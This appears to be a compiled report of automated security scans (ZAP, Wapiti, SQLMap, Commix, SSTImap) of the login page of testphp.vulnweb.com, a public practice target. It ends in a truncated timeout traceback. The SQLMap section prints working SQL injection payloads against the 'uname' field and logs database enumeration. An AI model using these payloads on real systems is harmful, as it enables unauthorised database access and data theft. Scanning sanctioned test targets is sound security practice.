# ZAP Scan Results
**Risk:** Medium
**Name:** Missing Anti-clickjacking Header
**URL:** http://testphp.vulnweb.com/login.php
**Description:** The response does not protect against 'ClickJacking' attacks. It should include either Content-Security-Policy with 'frame-ancestors' directive or X-Frame-Options.
**Solution:** Modern Web browsers support the Content-Security-Policy and X-Frame-Options HTTP headers. Ensure one of them is set on all web pages returned by your site/app.
If you expect the page to be framed only by pages on your server (e.g. it's part of a FRAMESET) then you'll want to use SAMEORIGIN, otherwise if you never expect the page to be framed, you should use DENY. Alternatively consider implementing Content Security Policy's "frame-ancestors" directive.
**Reference:** https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
---
**Risk:** Informational
**Name:** Charset Mismatch (Header Versus Meta Content-Type Charset)
**URL:** http://testphp.vulnweb.com/login.php
**Description:** This check identifies responses where the HTTP Content-Type header declares a charset different from the charset defined by the body of the HTML or XML. When there's a charset mismatch between the HTTP header and content body Web browsers can be forced into an undesirable content-sniffing mode to determine the content's correct character set.

An attacker could manipulate content on the page to be interpreted in an encoding of their choice. For example, if an attacker can control content at the beginning of the page, they could inject script using UTF-7 encoded text and manipulate some browsers into interpreting that text.
**Solution:** Force UTF-8 for all text content in both the HTTP header and meta tags in HTML or encoding declarations in XML.
**Reference:** https://code.google.com/p/browsersec/wiki/Part2#Character_set_handling_and_detection
---
**Risk:** Medium
**Name:** Content Security Policy (CSP) Header Not Set
**URL:** http://testphp.vulnweb.com/login.php
**Description:** Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross Site Scripting (XSS) and data injection attacks. These attacks are used for everything from data theft to site defacement or distribution of malware. CSP provides a set of standard HTTP headers that allow website owners to declare approved sources of content that browsers should be allowed to load on that page — covered types are JavaScript, CSS, HTML frames, fonts, images and embeddable objects such as Java applets, ActiveX, audio and video files.
**Solution:** Ensure that your web server, application server, load balancer, etc. is configured to set the Content-Security-Policy header.
**Reference:** https://developer.mozilla.org/en-US/docs/Web/Security/CSP/Introducing_Content_Security_Policy
https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
https://www.w3.org/TR/CSP/
https://w3c.github.io/webappsec-csp/
https://web.dev/articles/csp
https://caniuse.com/#feat=contentsecuritypolicy
https://content-security-policy.com/
---
**Risk:** Low
**Name:** Server Leaks Version Information via "Server" HTTP Response Header Field
**URL:** http://testphp.vulnweb.com/login.php
**Description:** The web/application server is leaking version information via the "Server" HTTP response header. Access to such information may facilitate attackers identifying other vulnerabilities your web/application server is subject to.
**Solution:** Ensure that your web server, application server, load balancer, etc. is configured to suppress the "Server" header or provide generic details.
**Reference:** https://httpd.apache.org/docs/current/mod/core.html#servertokens
https://learn.microsoft.com/en-us/previous-versions/msp-n-p/ff648552(v=pandp.10)
https://www.troyhunt.com/shhh-dont-let-your-response-headers/
---
**Risk:** Low
**Name:** X-Content-Type-Options Header Missing
**URL:** http://testphp.vulnweb.com/login.php
**Description:** The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.
**Solution:** Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.
If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.
**Reference:** https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/compatibility/gg622941(v=vs.85)
https://owasp.org/www-community/Security_Headers
---
**Risk:** Low
**Name:** Server Leaks Information via "X-Powered-By" HTTP Response Header Field(s)
**URL:** http://testphp.vulnweb.com/login.php
**Description:** The web/application server is leaking information via one or more "X-Powered-By" HTTP response headers. Access to such information may facilitate attackers identifying other frameworks/components your web application is reliant upon and the vulnerabilities such components may be subject to.
**Solution:** Ensure that your web server, application server, load balancer, etc. is configured to suppress "X-Powered-By" headers.
**Reference:** https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework
https://www.troyhunt.com/2012/02/shhh-dont-let-your-response-headers.html
---
# Wapiti Scan Results
## Clickjacking Protection
**Path:** /login.php
**Method:** GET
**Info:** X-Frame-Options is not set
**Level:** 1
**Parameter:** 
**Referer:** 
**Module:** http_headers
**HTTP Request:**
```
GET /login.php HTTP/1.1
host: testphp.vulnweb.com
connection: keep-alive
user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
accept-language: en-US
accept-encoding: gzip, deflate, br
accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
```
**CURL Command:**
```
curl "http://testphp.vulnweb.com/login.php"
```
---
## MIME Type Confusion
**Path:** /login.php
**Method:** GET
**Info:** X-Content-Type-Options is not set
**Level:** 1
**Parameter:** 
**Referer:** 
**Module:** http_headers
**HTTP Request:**
```
GET /login.php HTTP/1.1
host: testphp.vulnweb.com
connection: keep-alive
user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
accept-language: en-US
accept-encoding: gzip, deflate, br
accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
```
**CURL Command:**
```
curl "http://testphp.vulnweb.com/login.php"
```
---

# SQLMap Scan Results
**URL:** http://testphp.vulnweb.com/login.php
**Scope:** Page Only
**Results:**
```
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.2#pip}
|_ -| . [.]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:11:41 /2025-02-23/

[20:11:42] [INFO] testing connection to the target URL
[20:11:45] [INFO] searching for forms
[20:11:45] [INFO] found a total of 2 targets
[1/2] Form:
POST http://testphp.vulnweb.com/userinfo.php
POST data: uname=&pass=
do you want to test this form? [Y/n/q] 
> Y
Edit POST data [default: uname=&pass=] (Warning: blank fields detected): uname=&pass=
do you want to fill blank fields with random values? [Y/n] Y
[20:11:45] [INFO] using 'C:\Users\suriya\AppData\Local\sqlmap\output\results-02232025_0811pm.csv' as the CSV results file in multiple targets mode
got a 302 redirect to 'http://testphp.vulnweb.com/login.php'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
[20:11:46] [INFO] checking if the target is protected by some kind of WAF/IPS
[20:11:46] [INFO] testing if the target URL content is stable
[20:11:47] [WARNING] POST parameter 'uname' does not appear to be dynamic
[20:11:47] [INFO] heuristic (basic) test shows that POST parameter 'uname' might be injectable (possible DBMS: 'MySQL')
[20:11:47] [INFO] heuristic (XSS) test shows that POST parameter 'uname' might be vulnerable to cross-site scripting (XSS) attacks
[20:11:47] [INFO] testing for SQL injection on POST parameter 'uname'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[20:11:47] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[20:11:48] [WARNING] reflective value(s) found and filtering out
[20:11:53] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[20:11:54] [INFO] testing 'Generic inline queries'
[20:11:55] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[20:12:14] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[20:12:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[20:12:37] [INFO] POST parameter 'uname' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)' injectable 
[20:12:37] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[20:12:37] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[20:12:37] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[20:12:38] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[20:12:38] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[20:12:38] [INFO] POST parameter 'uname' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
[20:12:38] [INFO] testing 'MySQL inline queries'
[20:12:39] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[20:12:39] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[20:12:40] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[20:12:40] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[20:12:40] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[20:12:41] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[20:12:41] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[20:12:53] [INFO] POST parameter 'uname' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[20:12:53] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[20:12:53] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[20:12:53] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[20:12:54] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[20:12:56] [INFO] target URL appears to have 8 columns in query
[20:12:57] [INFO] POST parameter 'uname' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
[20:12:57] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
POST parameter 'uname' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 128 HTTP(s) requests:
---
Parameter: uname (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: uname=zCfm' OR NOT 7165=7165#&pass=oJiM

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: uname=zCfm' AND GTID_SUBSET(CONCAT(0x7171626a71,(SELECT (ELT(9122=9122,1))),0x71767a7671),9122)-- kxRG&pass=oJiM

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=zCfm' AND (SELECT 6864 FROM (SELECT(SLEEP(5)))JxpO)-- UtIo&pass=oJiM

    Type: UNION query
    Title: MySQL UNION query (NULL) - 8 columns
    Payload: uname=zCfm' UNION ALL SELECT NULL,CONCAT(0x7171626a71,0x6c4b4849616a4d64637a4b6279536b6153756c4b484450454a7a5972547177714b6263566c444261,0x71767a7671),NULL,NULL,NULL,NULL,NULL,NULL#&pass=oJiM
---
do you want to exploit this SQL injection? [Y/n] Y
[20:12:57] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.19.0, PHP 5.6.40
back-end DBMS: MySQL >= 5.6
[20:12:59] [INFO] fetching database names
[20:13:00] [INFO] retrieved: 'information_schema'
[20:13:00] [INFO] retrieved: 'acuart'
available databases [2]:
[*] acuart
[*] information_schema

SQL injection vulnerability has already been detected against 'testphp.vulnweb.com'. Do you want to skip further tests involving it? [Y/n] Y
[20:13:00] [INFO] skipping 'http://testphp.vulnweb.com/search.php?test=query'
[20:13:00] [INFO] you can find results of scanning in multiple targets mode inside the CSV file 'C:\Users\suriya\AppData\Local\sqlmap\output\results-02232025_0811pm.csv'

[*] ending @ 20:13:00 /2025-02-23/

```
---

# Commix Scan Results
**URL:** http://testphp.vulnweb.com/login.php
**Scope:** Page Only
**Results:**
```
                                      __
   ___   ___     ___ ___     ___ ___ /\_\   __  _
 /`___\ / __`\ /' __` __`\ /' __` __`\/\ \ /\ \/'\  v4.1-dev#12
/\ \__//\ \/\ \/\ \/\ \/\ \/\ \/\ \/\ \ \ \\/>  </
\ \____\ \____/\ \_\ \_\ \_\ \_\ \_\ \_\ \_\/\_/\_\ https://commixproject.com
 \/____/\/___/  \/_/\/_/\/_/\/_/\/_/\/_/\/_/\//\/_/ (@commixproject)

+--
Automated All-in-One OS Command Injection Exploitation Tool
Copyright � 2014-2025 Anastasios Stasinopoulos (@ancst)
+--

(!) Legal disclaimer: Usage of commix for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.

[20:13:01] [info] Testing connection to the target URL. 
[20:13:03] [info] Checking if the target is protected by some kind of WAF/IPS.
[20:13:04] [info] Performing identification (passive) tests to the target URL.
[20:13:04] [critical] No parameter(s) found for testing in the provided data (e.g. GET parameter 'id' in 'www.site.com/index.php?id=1'). You are advised to rerun with '--crawl=2'.
```
---

# SSTImap Scan Results
**URL:** http://testphp.vulnweb.com/login.php
**Error:**
```

    ╔══════╦══════╦═══════╗ ▀█▀
    ║ ╔════╣ ╔════╩══╗ ╔══╝═╗▀╔═
    ║ ╚════╣ ╚════╗  ║ ║    ║{║  _ __ ___   __ _ _ __
    ╚════╗ ╠════╗ ║  ║ ║    ║*║ | '_ ` _ \ / _` | '_ \
    ╔════╝ ╠════╝ ║  ║ ║    ║}║ | | | | | | (_| | |_) |
    ╚══════╩══════╝  ╚═╝    ╚╦╝ |_| |_| |_|\__,_| .__/
                             │                  | |
                                                |_|
[*] Version: 1.2.3
[*] Author: @vladko312 (https://github.com/vladko312)
[*] Based on Tplmap (https://github.com/epinna/tplmap)
[!] LEGAL DISCLAIMER: Usage of SSTImap for attacking targets without prior mutual consent is illegal.
It is the end user's responsibility to obey all applicable local, state and federal laws.
Developers assume no liability and are not responsible for any misuse or damage caused by this program
[*] Loaded plugins by categories: languages: 5; engines: 17; generic: 3; legacy_engines: 2
[*] Loaded request body types: 4

[*] Starting form detection...
[+] Form found: POST http://testphp.vulnweb.com/userinfo.php "uname=&pass="
[+] Form found: POST http://testphp.vulnweb.com/search.php?test=query "searchFor=&goButton=go"
[*] Scanning form with url: http://testphp.vulnweb.com/search.php?test=query
[*] Testing if Query parameter 'test' is injectable
[*] Cheetah plugin is testing rendering with tag '*'
[*] Cheetah plugin is testing }* code context escape with 6 variations
[*] Cheetah plugin is testing ]* code context escape with 6 variations
[*] Cheetah plugin is testing )* code context escape with 6 variations
[*] Cheetah plugin is testing blind injection
[*] Cheetah plugin is testing }* code context escape with 6 variations
[*] Cheetah plugin is testing ]* code context escape with 6 variations
[*] Cheetah plugin is testing )* code context escape with 6 variations
[*] Dot plugin is testing rendering with tag '*'
[*] Dot plugin is testing ;}}*{{1; code context escape with 6 variations
[*] Dot plugin is testing blind injection
[*] Dot plugin is testing ;}}*{{1; code context escape with 6 variations
[*] Dust plugin is testing rendering
[*] Dust plugin is testing blind injection
[*] Ejs plugin is testing rendering with tag '*'
[*] Ejs plugin is testing %>*<%# code context escape with 6 variations
[*] Ejs plugin is testing blind injection
[*] Ejs plugin is testing %>*<%# code context escape with 6 variations
[*] Erb plugin is testing rendering with tag '*'
[*] Erb plugin is testing blind injection
[*] Freemarker plugin is testing rendering with tag '*'
[*] Freemarker plugin is testing }* code context escape with 6 variations
[*] Freemarker plugin is testing blind injection
[*] Freemarker plugin is testing }* code context escape with 6 variations
[*] Jinja2 plugin is testing rendering with tag '*'
[*] Jinja2 plugin is testing }}* code context escape with 6 variations
[*] Jinja2 plugin is testing %}* code context escape with 6 variations
[*] Jinja2 plugin is testing blind injection
[*] Jinja2 plugin is testing }}* code context escape with 6 variations
[*] Jinja2 plugin is testing %}* code context escape with 6 variations
[*] Mako plugin is testing rendering with tag '*'
[*] Mako plugin is testing }* code context escape with 6 variations
[*] Mako plugin is testing %>*<%# code context escape with 6 variations
[*] Mako plugin is testing blind injection
[*] Mako plugin is testing }* code context escape with 6 variations
[*] Mako plugin is testing %>*<%# code context escape with 6 variations
[*] Marko plugin is testing rendering with tag '*'
[*] Marko plugin is testing }*${"1" code context escape with 6 variations
[*] Marko plugin is testing blind injection
[*] Marko plugin is testing }*${"1" code context escape with 6 variations
[*] Nunjucks plugin is testing rendering with tag '*'
[*] Nunjucks plugin is testing }}*{{1 code context escape with 6 variations
[*] Nunjucks plugin is testing  %}* code context escape with 6 variations
[*] Nunjucks plugin is testing blind injection
[*] Nunjucks plugin is testing }}*{{1 code context escape with 6 variations
[*] Nunjucks plugin is testing  %}* code context escape with 6 variations
[*] Pug plugin is testing rendering with tag '*'
[*] Pug plugin is testing )*// code context escape with 6 variations
[*] Pug plugin is testing blind injection
[*] Pug plugin is testing )*// code context escape with 6 variations
[*] Slim plugin is testing rendering with tag '*'
[*] Slim plugin is testing blind injection
[*] Smarty plugin is testing rendering with tag '*'
[*] Smarty plugin is testing }*{ code context escape with 6 variations
[*] Smarty plugin is testing blind injection
[*] Smarty plugin is testing }*{ code context escape with 6 variations
[*] Tornado plugin is testing rendering with tag '*'
[*] Tornado plugin is testing }}* code context escape with 6 variations
[*] Tornado plugin is testing %}* code context escape with 6 variations
[*] Tornado plugin is testing blind injection
[*] Tornado plugin is testing }}* code context escape with 6 variations
[*] Tornado plugin is testing %}* code context escape with 6 variations
[*] Twig plugin is testing rendering with tag '*'
[*] Twig plugin is testing }}*{{1 code context escape with 6 variations
[*] Twig plugin is testing  %}* code context escape with 6 variations
[*] Twig plugin is testing blind injection
[*] Twig plugin is testing }}*{{1 code context escape with 6 variations
[*] Twig plugin is testing  %}* code context escape with 6 variations
[*] Twig_v1 plugin is testing rendering with tag '*'
[*] Twig_v1 plugin is testing }}*{{1 code context escape with 6 variations
[*] Twig_v1 plugin is testing  %}* code context escape with 6 variations
[*] Twig_v1 plugin is testing blind injection
[*] Twig_v1 plugin is testing }}*{{1 code context escape with 6 variations
[*] Twig_v1 plugin is testing  %}* code context escape with 6 variations
[*] Velocity plugin is testing rendering with tag '*'
[*] Velocity plugin is testing )* code context escape with 6 variations
[*] Velocity plugin is testing blind injection
[*] Velocity plugin is testing )* code context escape with 6 variations
[*] Python plugin is testing rendering with tag '*'
[*] Python plugin is testing blind injection
[*] Javascript plugin is testing rendering with tag '*'
[*] Javascript plugin is testing ;*// code context escape with 6 variations
[*] Javascript plugin is testing blind injection
[*] Javascript plugin is testing ;*// code context escape with 6 variations
[*] Ruby plugin is testing rendering with tag '*'
[*] Ruby plugin is testing blind injection
[*] Java plugin is testing blind injection
[*] Php plugin is testing rendering with tag '*'
[*] Php plugin is testing ;*// code context escape with 6 variations
[*] Php plugin is testing blind injection
[*] Php plugin is testing ;*// code context escape with 6 variations
[*] Javascript_generic plugin is testing rendering with tag '*'
[*] Javascript_generic plugin is testing * code context escape with 4 variations
[*] Javascript_generic plugin is testing * code context escape with 4 variations
[*] Javascript_generic plugin is testing blind injection
[*] Javascript_generic plugin is testing * code context escape with 4 variations
[*] Javascript_generic plugin is testing * code context escape with 4 variations
[*] Php_generic plugin is testing rendering with tag '*'
[*] Php_generic plugin is testing * code context escape with 4 variations
[*] Php_generic plugin is testing * code context escape with 4 variations
[*] Php_generic plugin is testing blind injection
[*] Php_generic plugin is testing * code context escape with 4 variations
[*] Php_generic plugin is testing * code context escape with 4 variations
[*] Python_generic plugin is testing rendering with tag '*'
[*] Python_generic plugin is testing * code context escape with 4 variations
[*] Python_generic plugin is testing * code context escape with 4 variations
[*] Python_generic plugin is testing blind injection
[*] Python_generic plugin is testing * code context escape with 4 variations
[*] Python_generic plugin is testing * code context escape with 4 variations
[*] Testing if Body parameter 'searchFor' is injectable
[*] Cheetah plugin is testing rendering with tag '*'
[*] Cheetah plugin is testing }* code context escape with 6 variations
[*] Cheetah plugin is testing ]* code context escape with 6 variations
[*] Cheetah plugin is testing )* code context escape with 6 variations
[*] Cheetah plugin is testing blind injection
[*] Cheetah plugin is testing }* code context escape with 6 variations
[*] Cheetah plugin is testing ]* code context escape with 6 variations
[*] Cheetah plugin is testing )* code context escape with 6 variations
[*] Dot plugin is testing rendering with tag '*'
[*] Dot plugin is testing ;}}*{{1; code context escape with 6 variations
[*] Dot plugin is testing blind injection
[*] Dot plugin is testing ;}}*{{1; code context escape with 6 variations
[*] Dust plugin is testing rendering
[*] Dust plugin is testing blind injection
[*] Ejs plugin is testing rendering with tag '*'
[*] Ejs plugin is testing %>*<%# code context escape with 6 variations
[*] Ejs plugin is testing blind injection
[*] Ejs plugin is testing %>*<%# code context escape with 6 variations
[*] Erb plugin is testing rendering with tag '*'
[*] Erb plugin is testing blind injection
[*] Freemarker plugin is testing rendering with tag '*'
[*] Freemarker plugin is testing }* code context escape with 6 variations
[*] Freemarker plugin is testing blind injection
[*] Freemarker plugin is testing }* code context escape with 6 variations
[*] Jinja2 plugin is testing rendering with tag '*'
[*] Jinja2 plugin is testing }}* code context escape with 6 variations
[*] Jinja2 plugin is testing %}* code context escape with 6 variations
[*] Jinja2 plugin is testing blind injection
[*] Jinja2 plugin is testing }}* code context escape with 6 variations
[*] Jinja2 plugin is testing %}* code context escape with 6 variations
[*] Mako plugin is testing rendering with tag '*'
[*] Mako plugin is testing }* code context escape with 6 variations
[*] Mako plugin is testing %>*<%# code context escape with 6 variations
[*] Mako plugin is testing blind injection
[*] Mako plugin is testing }* code context escape with 6 variations
[*] Mako plugin is testing %>*<%# code context escape with 6 variations
[*] Marko plugin is testing rendering with tag '*'
[*] Marko plugin is testing }*${"1" code context escape with 6 variations
[*] Marko plugin is testing blind injection
[*] Marko plugin is testing }*${"1" code context escape with 6 variations
[*] Nunjucks plugin is testing rendering with tag '*'
[*] Nunjucks plugin is testing }}*{{1 code context escape with 6 variations
[*] Nunjucks plugin is testing  %}* code context escape with 6 variations
[*] Nunjucks plugin is testing blind injection
[*] Nunjucks plugin is testing }}*{{1 code context escape with 6 variations
[*] Nunjucks plugin is testing  %}* code context escape with 6 variations
[*] Pug plugin is testing rendering with tag '*'
[*] Pug plugin is testing )*// code context escape with 6 variations
[*] Pug plugin is testing blind injection
[*] Pug plugin is testing )*// code context escape with 6 variations
[*] Slim plugin is testing rendering with tag '*'
[*] Slim plugin is testing blind injection
[*] Smarty plugin is testing rendering with tag '*'
[*] Smarty plugin is testing }*{ code context escape with 6 variations
[*] Smarty plugin is testing blind injection
[*] Smarty plugin is testing }*{ code context escape with 6 variations
[*] Tornado plugin is testing rendering with tag '*'
[*] Tornado plugin is testing }}* code context escape with 6 variations
[*] Tornado plugin is testing %}* code context escape with 6 variations
[*] Tornado plugin is testing blind injection
[*] Tornado plugin is testing }}* code context escape with 6 variations
[*] Tornado plugin is testing %}* code context escape with 6 variations
[*] Twig plugin is testing rendering with tag '*'
[*] Twig plugin is testing }}*{{1 code context escape with 6 variations
[*] Twig plugin is testing  %}* code context escape with 6 variations
[*] Twig plugin is testing blind injection
[*] Twig plugin is testing }}*{{1 code context escape with 6 variations
[*] Twig plugin is testing  %}* code context escape with 6 variations
[*] Twig_v1 plugin is testing rendering with tag '*'
[*] Twig_v1 plugin is testing }}*{{1 code context escape with 6 variations
[*] Twig_v1 plugin is testing  %}* code context escape with 6 variations
[*] Twig_v1 plugin is testing blind injection
[*] Twig_v1 plugin is testing }}*{{1 code context escape with 6 variations
[*] Twig_v1 plugin is testing  %}* code context escape with 6 variations
[*] Velocity plugin is testing rendering with tag '*'
[*] Velocity plugin is testing )* code context escape with 6 variations
[*] Velocity plugin is testing blind injection
[*] Velocity plugin is testing )* code context escape with 6 variations
[*] Python plugin is testing rendering with tag '*'
[*] Python plugin is testing blind injection
[*] Javascript plugin is testing rendering with tag '*'
[*] Javascript plugin is testing ;*// code context escape with 6 variations
[*] Javascript plugin is testing blind injection
[*] Javascript plugin is testing ;*// code context escape with 6 variations
[*] Ruby plugin is testing rendering with tag '*'
[*] Ruby plugin is testing blind injection
[*] Java plugin is testing blind injection
[*] Php plugin is testing rendering with tag '*'
[*] Php plugin is testing ;*// code context escape with 6 variations
[*] Php plugin is testing blind injection
[*] Php plugin is testing ;*// code context escape with 6 variations
[*] Javascript_generic plugin is testing rendering with tag '*'
[*] Javascript_generic plugin is testing * code context escape with 4 variations
[*] Javascript_generic plugin is testing * code context escape with 4 variations
[*] Javascript_generic plugin is testing blind injection
[*] Javascript_generic plugin is testing * code context escape with 4 variations
[*] Javascript_generic plugin is testing * code context escape with 4 variations
[*] Php_generic plugin is testing rendering with tag '*'
[*] Php_generic plugin is testing * code context escape with 4 variations
[*] Php_generic plugin is testing * code context escape with 4 variations
[*] Php_generic plugin is testing blind injection
[*] Php_generic plugin is testing * code context escape with 4 variations
[*] Php_generic plugin is testing * code context escape with 4 variations
[*] Python_generic plugin is testing rendering with tag '*'
[*] Python_generic plugin is testing * code context escape with 4 variations
[*] Python_generic plugin is testing * code context escape with 4 variations
[*] Python_generic plugin is testing blind injection
[*] Python_generic plugin is testing * code context escape with 4 variations
[*] Python_generic plugin is testing * code context escape with 4 variations
[*] Testing if Body parameter 'goButton' is injectable
[*] Cheetah plugin is testing rendering with tag '*'
[*] Cheetah plugin is testing }* code context escape with 6 variations
[*] Cheetah plugin is testing ]* code context escape with 6 variations
[*] Cheetah plugin is testing )* code context escape with 6 variations
[*] Cheetah plugin is testing blind injection
[*] Cheetah plugin is testing }* code context escape with 6 variations
[*] Cheetah plugin is testing ]* code context escape with 6 variations
[*] Cheetah plugin is testing )* code context escape with 6 variations
[*] Dot plugin is testing rendering with tag '*'
[*] Dot plugin is testing ;}}*{{1; code context escape with 6 variations
[*] Dot plugin is testing blind injection
[*] Dot plugin is testing ;}}*{{1; code context escape with 6 variations
[*] Dust plugin is testing rendering
[*] Dust plugin is testing blind injection
[*] Ejs plugin is testing rendering with tag '*'
[*] Ejs plugin is testing %>*<%# code context escape with 6 variations
[*] Ejs plugin is testing blind injection
[*] Ejs plugin is testing %>*<%# code context escape with 6 variations
[*] Erb plugin is testing rendering with tag '*'
[*] Erb plugin is testing blind injection
[*] Freemarker plugin is testing rendering with tag '*'
[*] Freemarker plugin is testing }* code context escape with 6 variations
[*] Freemarker plugin is testing blind injection
[*] Freemarker plugin is testing }* code context escape with 6 variations
[*] Jinja2 plugin is testing rendering with tag '*'
[*] Jinja2 plugin is testing }}* code context escape with 6 variations
[*] Jinja2 plugin is testing %}* code context escape with 6 variations
[*] Jinja2 plugin is testing blind injection
[*] Jinja2 plugin is testing }}* code context escape with 6 variations
[*] Jinja2 plugin is testing %}* code context escape with 6 variations
[*] Mako plugin is testing rendering with tag '*'
[*] Mako plugin is testing }* code context escape with 6 variations
[*] Mako plugin is testing %>*<%# code context escape with 6 variations
[*] Mako plugin is testing blind injection
[*] Mako plugin is testing }* code context escape with 6 variations
[*] Mako plugin is testing %>*<%# code context escape with 6 variations
[*] Marko plugin is testing rendering with tag '*'
[*] Marko plugin is testing }*${"1" code context escape with 6 variations
[*] Marko plugin is testing blind injection
[*] Marko plugin is testing }*${"1" code context escape with 6 variations
[*] Nunjucks plugin is testing rendering with tag '*'
[*] Nunjucks plugin is testing }}*{{1 code context escape with 6 variations
[*] Nunjucks plugin is testing  %}* code context escape with 6 variations
[*] Nunjucks plugin is testing blind injection
[*] Nunjucks plugin is testing }}*{{1 code context escape with 6 variations
[*] Nunjucks plugin is testing  %}* code context escape with 6 variations
[*] Pug plugin is testing rendering with tag '*'
[*] Pug plugin is testing )*// code context escape with 6 variations
[*] Pug plugin is testing blind injection
[*] Pug plugin is testing )*// code context escape with 6 variations
[*] Slim plugin is testing rendering with tag '*'
[*] Slim plugin is testing blind injection
[*] Smarty plugin is testing rendering with tag '*'
[*] Smarty plugin is testing }*{ code context escape with 6 variations
[*] Smarty plugin is testing blind injection
[*] Smarty plugin is testing }*{ code context escape with 6 variations
[*] Tornado plugin is testing rendering with tag '*'
[*] Tornado plugin is testing }}* code context escape with 6 variations
[!] [sstimap] Error: HTTPConnectionPool(host='testphp.vulnweb.com', port=80): Read timed out. (read timeout=None)
Traceback (most recent call last):
  File "C:\Users\suriya\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\urllib3\connectionpool.py", line 534, in _make_request
    response = conn.getresponse()
               ^^^^^^^^^^^^^^^^^^
  File "C:\Users\suriya\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\urllib3\connection.py", line 516, in getresponse
    httplib_response = super().getresponse()
                       ^^^^^^^^^^^^^^^^^^^^^
  File "C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.11_3.11.2544.0_x64__qbz5n2kfra8p0\Lib\http\client.py", line 1395, in getresponse
    response.begin()
  File "C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.11_3.11.2544.0_x64__qbz5n2kfra8p0\Lib\http\client.py", line 325, in begin
    version, status, reason = self._read_status()
                              ^^^^^^^^^^^^^^^^^^^
  File "C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.11_3.11.2544.0_x64__qbz5n2kfra8p0\Lib\http\client.py", line 286, in _read_status
    line = str(self.fp.readline(_MAXLINE + 1), "iso-8859-1")
